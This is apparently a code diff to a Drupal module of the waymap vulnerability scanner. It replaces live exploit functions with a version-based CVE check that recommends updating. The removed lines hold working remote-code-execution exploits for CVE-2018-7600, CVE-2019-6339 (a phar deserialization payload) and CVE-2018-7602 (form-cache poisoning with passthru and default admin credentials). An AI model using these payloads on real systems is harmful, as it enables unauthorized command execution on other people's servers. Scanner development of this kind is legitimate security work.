@@ -1,180 +1,96 @@
 # Copyright (c) 2024 waymap developers
 # See the file 'LICENSE' for copying permission.
-# dp.py profile critical
+# dp.py Critical-risk
 
-from colorama import Fore, Style, init
 import requests
-from bs4 import BeautifulSoup
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from packaging.version import parse as parse_version
+from colorama import Fore, Style
+from datetime import datetime
+from lib.ProfileCritical.drupal_version import fetch_drupal_version
+from lib.core.settings import CVE_DB_URL
+from data.cveinfo import CVE_DATACRIT_DRUPAL
 
-# Initialization
-init(autoreset=True)
+def determine_severity(cvss_score):
+    """Determine severity based on CVSS v3.x score."""
+    if cvss_score == 0.0:
+        return "None"
+    elif 0.1 <= cvss_score <= 3.9:
+        return "Low"
+    elif 4.0 <= cvss_score <= 6.9:
+        return "Medium"
+    elif 7.0 <= cvss_score <= 8.9:
+        return "High"
+    elif 9.0 <= cvss_score <= 10.0:
+        return "Critical"
+    return "Unknown"
 
-# Color Configuration
-class Color:
-    IMPORTANT = '\33[35m'
-    NOTICE = '\033[33m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    RED = '\033[91m'
-    END = '\033[0m'
+def fetch_cve_details(cve_id):
+    """Fetch CVE details from CVE database."""
+    url = CVE_DB_URL.format(cve_id=cve_id)
+    response = requests.get(url)
+    return response.json() if response.status_code == 200 else {}
 
-color_random = [Color.IMPORTANT, Color.NOTICE, Color.OKGREEN, Color.WARNING, Color.RED, Color.END]
+def is_vulnerable(version, cve_info):
+    """Generic function to check if the version is vulnerable based on CVE info."""
+    if version:
+        parsed_version = parse_version(version)
+        vulnerable_versions = cve_info["vulnerable_version"].split(",")
+        
+        for v_range in vulnerable_versions:
+            v_range = v_range.strip()
+            if '-' in v_range: 
+                start, end = v_range.split('-')
+                if parse_version(start) <= parsed_version <= parse_version(end):
+                    return True
+            elif parse_version(v_range) == parsed_version:
+                return True
+    return False
 
-# CVE-2018-7600 EXPLOIT STARTS
-def scan_cve_2018_7600(profile_url):
-    target_url = f"{profile_url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
-    data = {"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"}
-
-    print(f"{Color.WARNING}[*] Testing if: {profile_url} is vulnerable{Color.END}")
-    
+def scan_cve(target_url, cve_id, cve_info):
+    """Generic CVE scan function with exception handling for KeyboardInterrupt."""
     try:
-        response = requests.post(target_url, headers=headers, data=data, verify=False)
-        if response.status_code == 200 and "haha" in response.text:
-            print(f"{Color.RED}[!] The target {profile_url} is vulnerable to SA-CORE-2018-002 / CVE-2018-7600{Color.END}")
+        current_time = datetime.now().strftime("%H:%M:%S") 
+        print(f"[{Fore.BLUE}{current_time}{Style.RESET_ALL}]::{Fore.GREEN}[Checking]{Style.RESET_ALL}~ {cve_id}")
+
+        print(f"{Style.BRIGHT}{Fore.WHITE}[Testing Target: {target_url}]{Style.RESET_ALL}")
+
+        version = fetch_drupal_version(target_url)
+        if version:
+            print(f"{Style.BRIGHT}{Fore.CYAN}[i] Detected Drupal version: {version}{Style.RESET_ALL}")
+            if is_vulnerable(version, cve_info):
+                print(f"{Style.BRIGHT}{Fore.GREEN}[!] Target is vulnerable to {cve_id} ({version}){Style.RESET_ALL}")
+                cve_details = fetch_cve_details(cve_id)
+                if cve_details:
+                    print(f"{Style.BRIGHT}{Fore.CYAN}Summary: {cve_details.get('summary', 'N/A')}{Style.RESET_ALL}")
+                    print(f"{Style.BRIGHT}{Fore.CYAN}CVSS Score: {cve_details.get('cvss_score', 'N/A')}{Style.RESET_ALL}")
+                    print(f"{Style.BRIGHT}{Fore.CYAN}Severity: {determine_severity(cve_details.get('cvss_score', 0))}{Style.RESET_ALL}")
+                print(f"{Style.BRIGHT}{Fore.YELLOW}[!] Recommendation: Update Drupal to a secure version to mitigate {cve_id}.{Style.RESET_ALL}")
+            else:
+                print(f"{Style.BRIGHT}{Fore.RED}[+] Target is not vulnerable to {cve_id} ({version}).{Style.RESET_ALL}")
         else:
-            print(f"{Color.OKGREEN}[*] - The target {profile_url} is not vulnerable{Color.END}")
-    except Exception as e:
-        print(f"{Color.RED}[!] - Something went wrong: {str(e)}{Color.END}")
-
-# CVE-2019-6339 EXPLOIT STARTS
-def scan_cve_2019_6339(profile_url):
-    vuln_url = profile_url + "/phar.phar"
-    payload = (
-        b"\x47\x49\x46\x38\x39\x61"  
-        b"<?php __HALT_COMPILER(); ?>"
-        b'O:24:"GuzzleHttp\\Psr7\\FnStream":1:{s:9:"_fn_close";s:7:"phpinfo";}'
-    )
-
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
-        'Connection': "close",
-        'Content-Type': "application/octet-stream",
-        'Accept': "*/*",
-        'Cache-Control': "no-cache"
-    }
-
-    try:
-        response = requests.post(vuln_url, data=payload, headers=headers, verify=False)
-        if response.status_code == 200:
-            print(color_random[2] + "\n[+] Server is vulnerable to CVE-2019-6339. `phpinfo` executed.\n" + Color.END)
-            print(color_random[3] + response.text + Color.END)
-        else:
-            print(color_random[4] + f"\n[!] No vulnerability detected. Status Code: {response.status_code}\n" + Color.END)
-    except requests.RequestException as e:
-        print(color_random[4] + "\n[!] An error occurred while sending the request.\n" + Color.END)
-        print(color_random[3] + f"Error details: {str(e)}" + Color.END)
-
-# CVE-2018-7602 EXPLOIT STARTS
-def exploit_target_7602(profile_url):
-    username = "admin"  
-    password = "admin"  
-    command = "id"     
-    function = "passthru"  
-
-    session = requests.Session()
-
-    try:
-        print(Color.OKGREEN + '[*] Initiating session with the provided credentials...' + Color.END)
-        get_params = {'q': 'user/login'}
-        post_params = {'form_id': 'user_login', 'name': username, 'pass': password, 'op': 'Log in'}
-        
-        login_response = session.post(profile_url, params=get_params, data=post_params, verify=False)
-        if login_response.status_code != 200 or 'logout' not in login_response.text:
-            print(Color.RED + "[-] Login failed. Exiting." + Color.END)
-            return 
-        
-        get_params = {'q': 'user'}
-        r = session.get(profile_url, params=get_params, verify=False)
-        
-        soup = BeautifulSoup(r.text, "html.parser")
-        user_id_tag = soup.find('meta', {'property': 'foaf:name'})
-        if not user_id_tag:
-            print(Color.RED + "[-] Failed to retrieve User ID. Exiting." + Color.END)
-            return  
-
-        user_id = user_id_tag.get('about')
-        if "?q=" in user_id:
-            user_id = user_id.split("=")[1]
-
-        if user_id:
-            print(Color.OKGREEN + '[+] Successfully retrieved User ID: ' + user_id + Color.END)
-        else:
-            print(Color.RED + "[-] User ID extraction failed. Exiting." + Color.END)
-            return  
-
-        print(Color.OKGREEN + '[*] Poisoning the form using the `destination` variable and caching it...' + Color.END)
-        get_params = {'q': user_id + '/cancel'}
-        r = session.get(profile_url, params=get_params, verify=False)
-        soup = BeautifulSoup(r.text, "html.parser")
-        
-        form = soup.find('form', {'id': 'user-cancel-confirm-form'})
-        if not form:
-            print(Color.RED + "[-] Failed to find cancel form. Exiting." + Color.END)
-            return 
-
-        form_token = form.find('input', {'name': 'form_token'}).get('value')
-        if not form_token:
-            print(Color.RED + "[-] Failed to retrieve form token. Exiting." + Color.END)
-            return 
-
-        get_params = {
-            'q': user_id + '/cancel',
-            'destination': user_id + '/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command
-        }
-        post_params = {'form_id': 'user_cancel_confirm_form', 'form_token': form_token, '_triggering_element_name': 'form_id', 'op': 'Cancel account'}
-        r = session.post(profile_url, params=get_params, data=post_params, verify=False)
-        
-        soup = BeautifulSoup(r.text, "html.parser")
-        form_build_id = soup.find('input', {'name': 'form_build_id'}).get('value')
-
-        if form_build_id:
-            print(Color.OKGREEN + '[+] Poisoned form with ID: ' + form_build_id + Color.END)
-            print(Color.OKGREEN + '[*] Triggering the exploit to execute the command: ' + command + Color.END)
-            
-            get_params = {'q': 'file/ajax/actions/cancel/#options/path/' + form_build_id}
-            post_params = {'form_build_id': form_build_id}
-            r = session.post(profile_url, params=get_params, data=post_params, verify=False)
-            
-            parsed_result = r.text.split('[{"command":"settings"')[0]
-            print(parsed_result)
-        else:
-            print(Color.RED + "[-] Failed to retrieve form build ID. Exiting." + Color.END)
-
-    except Exception as e:
-        print(Color.RED + "[!] ERROR: Something went wrong during the exploit." + Color.END)
-        print("Error details: %s" % str(e))
-
-def scan_cve_2018_7602(profile_url):
-    exploit_target_7602(profile_url)
-
-
-def handle_cve_2019_6339(profile_url):
-    try:
-        print("\n")
-        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2019_6339 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
-        scan_cve_2019_6339(profile_url)
-        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2019_6339 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
+            print(f"{Style.BRIGHT}{Fore.YELLOW}[!] Could not detect Drupal version. Skipping vulnerability checks.{Style.RESET_ALL}")
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2019_6339 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
-        return
-def handle_cve_2018_7602(profile_url):
-    try:
-        print("\n")
-        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2018_7602 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
-        scan_cve_2018_7602(profile_url)
-        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2018_7602 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
-    except KeyboardInterrupt:
-        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2018_7602 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
-        return
-def handle_cve_2018_7600(profile_url):
-    try:
-        print("\n")
-        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2018_7600 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
-        scan_cve_2018_7600(profile_url)
-        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2018_7600 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
-    except KeyboardInterrupt:
-        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2018_7600 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
-        return
+        handle_user_interrupt()
+
+def handle_user_interrupt():
+    """Handle user interruption (Ctrl+C) gracefully."""
+    print("\n[!] Scan interrupted by user. Options:")
+    while True:
+        user_input = input(f"{Style.BRIGHT}{Fore.CYAN}Enter 'n' for next target, 'e' to exit, or press Enter to resume: {Style.RESET_ALL}")
+        if user_input.lower() == 'n':
+            print(f"{Style.BRIGHT}{Fore.GREEN}Skipping to next target...{Style.RESET_ALL}")
+            break
+        elif user_input.lower() == 'e':
+            print(f"{Style.BRIGHT}{Fore.RED}Exiting...{Style.RESET_ALL}")
+            exit(0)
+        elif user_input == '':
+            print(f"{Style.BRIGHT}{Fore.GREEN}Resuming scan...{Style.RESET_ALL}")
+            break
+        else:
+            print(f"{Style.BRIGHT}{Fore.YELLOW}Invalid input. Please try again.{Style.RESET_ALL}")
+            continue
+
+def scan_all_cves_for_target(target_url):
+    """Scan a target URL against all known CVEs for Drupal."""
+    for cve_info in CVE_DATACRIT_DRUPAL:
+        scan_cve(target_url, cve_info['cve_id'], cve_info)
